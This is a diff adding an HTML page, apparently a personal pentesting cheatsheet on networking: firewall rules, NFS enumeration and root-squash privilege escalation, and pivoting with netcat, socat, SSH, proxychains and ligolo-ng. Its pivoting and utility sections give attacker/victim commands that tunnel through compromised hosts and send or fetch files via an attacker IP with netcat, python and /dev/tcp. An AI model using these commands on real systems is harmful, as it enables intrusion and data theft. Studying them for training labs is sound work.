@@ -1,0 +1,329 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="https://ojack69.github.io/jacks-corner/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="https://ojack69.github.io/jacks-corner/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/zoom.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/app.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="Firewall Redirect all requests on loopback interface (lo) port 80 to port 8080: sudo iptables -t nat -A OUTPUT -o lo -p tcp --dport 80 -j REDIRECT --to-port 8080 Create a Windows firewall rule: netsh advfirewall firewall add rule name=&#34;&lt;rule name&gt;&#34; dir=&lt;in|out&gt; action=&lt;allow|deny&gt; protocol=&lt;protocol …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="Network Cheatsheet"/>
+  <meta property="og:description" content="Firewall Redirect all requests on loopback interface (lo) port 80 to port 8080: sudo iptables -t nat -A OUTPUT -o lo -p tcp --dport 80 -j REDIRECT --to-port 8080 Create a Windows firewall rule: netsh advfirewall firewall add rule name=&#34;&lt;rule name&gt;&#34; dir=&lt;in|out&gt; action=&lt;allow|deny&gt; protocol=&lt;protocol …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="https://ojack69.github.io/jacks-corner/misc/network.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="1957-01-01 00:00:00+01:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="https://ojack69.github.io/jacks-corner/author/jack69.html">
+  <meta property="article:section" content="Cheatsheet"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; Network Cheatsheet</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="https://ojack69.github.io/jacks-corner/">
+      <img src="https://ojack69.github.io/jacks-corner/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="https://ojack69.github.io/jacks-corner/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="https://ojack69.github.io/jacks-corner/">Home</a>
+
+  <a href="https://ojack69.github.io/jacks-corner/categories.html">Categories</a>
+  <a href="https://ojack69.github.io/jacks-corner/category/cheatsheet.html">Cheatsheets</a>
+  <a href="https://ojack69.github.io/jacks-corner/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="misc/network">Network Cheatsheet</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+        <div class="toc col-lg-3 hidden-xs hidden-sm">
+            <div id="toc"><ul><li><a class="toc-href" href="#firewall" title="Firewall">Firewall</a></li><li><a class="toc-href" href="#mail" title="Mail">Mail</a></li><li><a class="toc-href" href="#nfs" title="NFS">NFS</a><ul><li><a class="toc-href" href="#root-squash-privilege-escalation" title="Root Squash - Privilege Escalation">Root Squash - Privilege Escalation</a></li></ul></li><li><a class="toc-href" href="#pivoting_1" title="Pivoting">Pivoting</a><ul><li><a class="toc-href" href="#netcat" title="netcat">netcat</a></li><li><a class="toc-href" href="#socat" title="socat">socat</a></li><li><a class="toc-href" href="#ssh" title="SSH">SSH</a></li><li><a class="toc-href" href="#proxychains" title="Proxychains">Proxychains</a></li><li><a class="toc-href" href="#ligolo-ng" title="ligolo-ng">ligolo-ng</a></li></ul></li><li><a class="toc-href" href="#utils_1" title="Utils">Utils</a></li></ul></div>
+        </div>
+    <h2 id="firewall">Firewall</h2>
+<p>Redirect all requests on loopback interface (lo) port 80 to port 8080:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>iptables<span class="w"> </span>-t<span class="w"> </span>nat<span class="w"> </span>-A<span class="w"> </span>OUTPUT<span class="w"> </span>-o<span class="w"> </span>lo<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">80</span><span class="w"> </span>-j<span class="w"> </span>REDIRECT<span class="w"> </span>--to-port<span class="w"> </span><span class="m">8080</span>
+</code></pre></div>
+<p>Create a Windows firewall rule:</p>
+<div class="highlight"><pre><span></span><code>netsh advfirewall firewall add rule name="&lt;rule name&gt;" dir=&lt;in|out&gt; action=&lt;allow|deny&gt; protocol=&lt;protocol&gt; localport=&lt;port&gt;
+</code></pre></div>
+<h2 id="mail">Mail</h2>
+<p>Start a debugging mail server:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Deprecated since python 3.12</span>
+python<span class="w"> </span>-m<span class="w"> </span>smtpd<span class="w"> </span>-n<span class="w"> </span>-c<span class="w"> </span>DebuggingServer<span class="w"> </span>localhost:25
+
+<span class="c1"># Using https://aiosmtpd.aio-libs.org/en/latest/index.html</span>
+<span class="c1">## Start a debug server on port 8025</span>
+python<span class="w"> </span>-m<span class="w"> </span>aiosmtpd<span class="w"> </span>-n
+</code></pre></div>
+<p><strong>Note</strong>: Always better to not run it as root; use instead <code>iptables</code> to redirect traffic from a not restricted port (eg. <code>2525</code>) to <code>25</code>.</p>
+<p>Send an email via specified mail-server using <code>swaks</code>:</p>
+<div class="highlight"><pre><span></span><code>swaks<span class="w"> </span>--to<span class="w"> </span>&lt;recipient&gt;<span class="w"> </span>--server<span class="w"> </span>&lt;mail<span class="w"> </span>server&gt;<span class="w"> </span>--from<span class="w"> </span>&lt;sender&gt;<span class="w"> </span>--header<span class="w"> </span><span class="s2">"&lt;subject&gt;"</span><span class="w"> </span>--body<span class="w"> </span><span class="s2">"&lt;markdown body content&gt;"</span>
+</code></pre></div>
+<h2 id="nfs">NFS</h2>
+<p>Enumeration:</p>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">111</span>,2049<span class="w"> </span>--script<span class="o">=</span><span class="s2">"nfs-*"</span><span class="w"> </span>&lt;target<span class="w"> </span>ip&gt;
+</code></pre></div>
+<p>Show export list:</p>
+<div class="highlight"><pre><span></span><code>showmount<span class="w"> </span>-e<span class="w"> </span>&lt;target<span class="w"> </span>ip&gt;
+</code></pre></div>
+<p>Mount remote shared folder to local folder:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>mount<span class="w"> </span>&lt;target<span class="w"> </span>ip&gt;:&lt;remote<span class="w"> </span>dir&gt;<span class="w"> </span>&lt;<span class="nb">local</span><span class="w"> </span>dir&gt;
+</code></pre></div>
+<p>Unmount volume:</p>
+<div class="highlight"><pre><span></span><code>sudo umount &lt;local mount point&gt; [-l] [-f]
+</code></pre></div>
+<p>where: </p>
+<ul>
+<li><code>-l</code> : lazy unmount - unmount the volume while the software is still running</li>
+<li><code>-f</code>: force unmounting</li>
+</ul>
+<h3 id="root-squash-privilege-escalation">Root Squash - Privilege Escalation</h3>
+<p>When placing a file into a mounted share, it will inherit current user's UID and GID. This means that it's possible to place an executable binary into the folder by spoofing the UID/GID on the attacker machine (i.e. creating a temporary user and group with the desired ids on the local machine) and then set the SUID so that, on the remote machine, the binary will be ran as the target user.</p>
+<ul>
+<li>By default, <strong>root squash</strong> is enabled. This security mechanism prevents placing files belonging to root (UID and GID = 0). Generally, those files will be mapped to <code>nobody</code>.</li>
+<li>If the option <code>no_root_squash</code> is enabled for a share, it's possible to place files as root and escalate privileges.</li>
+</ul>
+<p>On the NFS server, exports are defined at <code>/etc/exports</code>; check this file (having access to server) to enumerate exports and their options (such as <code>no_root_squash</code>).</p>
+<ul>
+<li>Another way to check if <code>no_root_squash</code> is enabled is to place a file in the shared folder as root; if the UID is mapped to <code>nobody</code> then the <code>no_root_squash</code> is not active.</li>
+</ul>
+<h2 id="pivoting_1">Pivoting</h2>
+<h3 id="netcat">netcat</h3>
+<p>Remote port forwarding (raw http required for http request):</p>
+<div class="highlight"><pre><span></span><code>mknod<span class="w"> </span>node1<span class="w"> </span>p
+nc<span class="w"> </span>&lt;<span class="nb">local</span><span class="w"> </span>address&gt;<span class="w"> </span>&lt;<span class="nb">local</span><span class="w"> </span>port&gt;<span class="w"> </span>&gt;<span class="w"> </span>node1<span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>&lt;remote<span class="w"> </span>address&gt;<span class="w"> </span>&lt;remote<span class="w"> </span>port&gt;<span class="w"> </span>&lt;<span class="w"> </span>node1
+</code></pre></div>
+<p>Remote port forwarding with track of input and output messages:</p>
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>&lt;<span class="nb">local</span><span class="w"> </span>address&gt;<span class="w"> </span>&lt;<span class="nb">local</span><span class="w"> </span>port&gt;<span class="w"> </span>&lt;<span class="w"> </span>node1<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>&lt;remote<span class="w"> </span>address&gt;<span class="w"> </span>&lt;remote<span class="w"> </span>port&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>out<span class="w"> </span>&gt;<span class="w"> </span>node1
+
+nc<span class="w"> </span>&lt;remote<span class="w"> </span>address&gt;<span class="w"> </span>&lt;remote<span class="w"> </span>port&gt;<span class="w"> </span>&lt;<span class="w"> </span>node1<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>&lt;<span class="nb">local</span><span class="w"> </span>address&gt;<span class="w"> </span>&lt;<span class="nb">local</span><span class="w"> </span>port&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>out<span class="w"> </span>&gt;<span class="w"> </span>node1
+</code></pre></div>
+<h3 id="socat">socat</h3>
+<p>Remote Port Forwarding:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Attacker</span>
+socat<span class="w"> </span>tcp4-listen:&lt;server<span class="w"> </span>port&gt;,reuseaddr,fork<span class="w"> </span>tcp4-listen:&lt;forward<span class="w"> </span>target<span class="w"> </span>port&gt;,reuseaddr
+
+<span class="c1"># Victim</span>
+<span class="k">while</span><span class="w"> </span>true<span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>socat<span class="w"> </span>TCP4:&lt;attacker&gt;:&lt;server<span class="w"> </span>port&gt;<span class="w"> </span>TCP4:127.0.0.1:&lt;to<span class="w"> </span>forward<span class="w"> </span>port&gt;<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
+</code></pre></div>
+<p>IPV6 Tunneling:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># UDP:</span>
+socat<span class="w"> </span>UDP4-LISTEN:5683,fork,su<span class="o">=</span>nobody<span class="w"> </span>UDP6:<span class="o">[</span>aaaa::212:4b00:615:a1f7<span class="o">]</span>:5683
+
+<span class="c1"># TCP:</span>
+socat<span class="w"> </span>TCP4-LISTEN:22,fork,su<span class="o">=</span>nobody<span class="w"> </span>TCP6:<span class="o">[</span>2a01:198:79d:1::8<span class="o">]</span>:22
+
+<span class="c1"># UDP, IPv6</span>
+socat<span class="w"> </span>UDP6-LISTEN:5683,fork,su<span class="o">=</span>nobody<span class="w"> </span>UDP6:<span class="o">[</span>aaaa::212:4b00:615:a1f7<span class="o">]</span>:5683
+
+<span class="c1"># Using in a script:</span>
+nohup<span class="w"> </span>socat<span class="w"> </span>TCP4-LISTEN:22,fork,su<span class="o">=</span>nobody<span class="w"> </span>TCP6:<span class="o">[</span>2a01:198:79d:1::8<span class="o">]</span>:22<span class="w"> </span><span class="p">&amp;</span>
+</code></pre></div>
+<h3 id="ssh">SSH</h3>
+<p>Local Port Forwarding:</p>
+<div class="highlight"><pre><span></span><code>ssh<span class="w"> </span>-L<span class="w"> </span><span class="o">[</span>bind_address:<span class="o">]</span>port:host:hostport<span class="w"> </span>&lt;user&gt;@&lt;host&gt;<span class="w"> </span><span class="o">[</span>-N<span class="o">]</span>
+</code></pre></div>
+<p>Remote Port Forwarding:</p>
+<div class="highlight"><pre><span></span><code>ssh<span class="w"> </span>-R<span class="w"> </span><span class="o">[</span>bind_address:<span class="o">]</span>port:host:hostport<span class="w"> </span>&lt;user&gt;@&lt;host&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;port&gt;<span class="w"> </span><span class="o">[</span>-N<span class="o">]</span>
+</code></pre></div>
+<p>Start a SOCKS proxy:</p>
+<div class="highlight"><pre><span></span><code>ssh<span class="w"> </span>&lt;user&gt;@&lt;host&gt;<span class="w"> </span>-D<span class="w"> </span>&lt;port&gt;<span class="w"> </span>-N
+</code></pre></div>
+<p>In Windows, use <a href="https://www.cog-genomics.org/plink/">plink</a> which wraps SSH to create connection to remote hosts. Syntax is mostly similar. </p>
+<h3 id="proxychains">Proxychains</h3>
+<p>Setup SOCKS proxy port in <code>/etc/proxychains.conf</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="k">[ProxyList]</span>
+<span class="na">socks4  &lt;address&gt; &lt;port&gt;</span>
+<span class="c1"># or</span>
+<span class="c1"># socks5 &lt;address&gt; &lt;port&gt;</span>
+</code></pre></div>
+<p>Use SOCKS proxy when running a command:</p>
+<div class="highlight"><pre><span></span><code>proxychains<span class="w"> </span>&lt;command&gt;
+</code></pre></div>
+<h3 id="ligolo-ng">ligolo-ng</h3>
+<p><a href="https://github.com/nicocha30/ligolo-ng">ligolo-ng</a> is a <em>simple</em>, <em>lightweight</em> and <em>fast</em> tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a <strong>tun interface</strong> (without the need of SOCKS).</p>
+<div class="highlight"><pre><span></span><code><span class="nx">sudo</span><span class="w"> </span><span class="nx">ip</span><span class="w"> </span><span class="nx">tuntap</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="p">&lt;</span><span class="nx">your_user</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">mode</span><span class="w"> </span><span class="nx">tun</span><span class="w"> </span><span class="nx">ligolo</span>
+<span class="nx">sudo</span><span class="w"> </span><span class="nx">ip</span><span class="w"> </span><span class="nx">link</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">ligolo</span><span class="w"> </span><span class="nx">up</span>
+<span class="nx">sudo</span><span class="w"> </span><span class="nx">ip</span><span class="w"> </span><span class="nx">route</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="p">&lt;</span><span class="nx">target</span><span class="w"> </span><span class="nx">pivoted</span><span class="w"> </span><span class="nx">subnet</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">dev</span><span class="w"> </span><span class="nx">ligolo</span>
+
+<span class="p">.</span><span class="o">/</span><span class="nx">proxy</span><span class="w"> </span><span class="o">-</span><span class="nx">selfcert</span><span class="w"> </span><span class="o">-</span><span class="nx">laddr</span><span class="w"> </span><span class="m m-Double">0.0.0.0</span><span class="p">:</span><span class="mi">443</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>.<span class="o">/</span><span class="nv">agent</span><span class="w"> </span><span class="o">-</span><span class="k">connect</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">attacker</span><span class="w"> </span><span class="nv">ip</span><span class="o">&gt;</span>:<span class="mi">443</span><span class="w"> </span><span class="o">-</span><span class="nv">ignore</span><span class="o">-</span><span class="nv">cert</span>
+</code></pre></div>
+<p>After the <code>agent</code> is connected to the attacker server:</p>
+<div class="highlight"><pre><span></span><code>&gt; session
+# Select session
+
+&gt; start
+# start tunnel
+</code></pre></div>
+<h2 id="utils_1">Utils</h2>
+<p>Send http request with python3, useful when curl is unavailable:</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">"import requests; files={'file': open('res','r')}; requests.post('[http://192.168.56.108:8000',](http://192.168.56.108:8000',) files=files)"</span>
+</code></pre></div>
+<p>Send file through NC:</p>
+<div class="highlight"><pre><span></span><code>//<span class="w"> </span>Receiver
+nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">1234</span><span class="w"> </span>&gt;<span class="w"> </span>something.zip<span class="w"> </span>
+
+//<span class="w"> </span>Sender
+cat<span class="w"> </span>something.zip<span class="w"> </span><span class="p">|</span><span class="w"> </span>netcat<span class="w"> </span>server.ip.here<span class="w"> </span><span class="m">1234</span>
+</code></pre></div>
+<p>Transfer files using raw HTTP requests when no wget, curl or ssh is not available:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># on the attacker machine</span>
+python<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="o">[</span>&lt;port&gt;<span class="o">]</span>
+
+<span class="c1"># on the victim</span>
+<span class="nb">exec</span><span class="w"> </span><span class="m">3</span>&lt;&gt;<span class="w"> </span>/dev/tcp/&lt;attacker<span class="w"> </span>ip&gt;/&lt;attacker<span class="w"> </span>port&gt;
+<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"GET /&lt;filename&gt; HTTP/1.1\r\nHost: &lt;attacker ip&gt;\r\nConnection: close\r\n\r\n"</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">3</span>
+cat<span class="w"> </span>&lt;<span class="p">&amp;</span><span class="m">3</span><span class="w"> </span>&gt;<span class="w"> </span>&lt;filename&gt;
+</code></pre></div>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2025 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="https://ojack69.github.io/jacks-corner/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "https://ojack69.github.io/jacks-corner",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("https://ojack69.github.io/jacks-corner/theme/stork/stork.wasm")
+      stork.register("sitesearch", "https://ojack69.github.io/jacks-corner/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="https://ojack69.github.io/jacks-corner/theme/stork/stork.js"></script>
+
+</body>
+</html>
